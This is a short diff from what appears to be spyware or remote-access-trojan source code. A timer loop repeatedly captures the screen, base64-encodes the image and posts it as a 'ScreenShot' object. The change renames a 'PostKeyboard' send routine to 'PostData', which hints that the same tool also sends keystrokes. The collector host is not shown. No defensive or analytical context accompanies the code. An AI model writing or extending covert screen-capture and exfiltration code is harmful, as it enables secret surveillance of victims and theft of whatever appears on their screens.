@@ -11,7 +11,7 @@ setInterval(function(){
    
         var string = img.toString('base64');
         let object={'Type':"ScreenShot",'Out':string};
-        shared.PostKeyboard(object);
+        shared.PostData(object);
     }).catch((err) => {
     console.log(err);
     })   
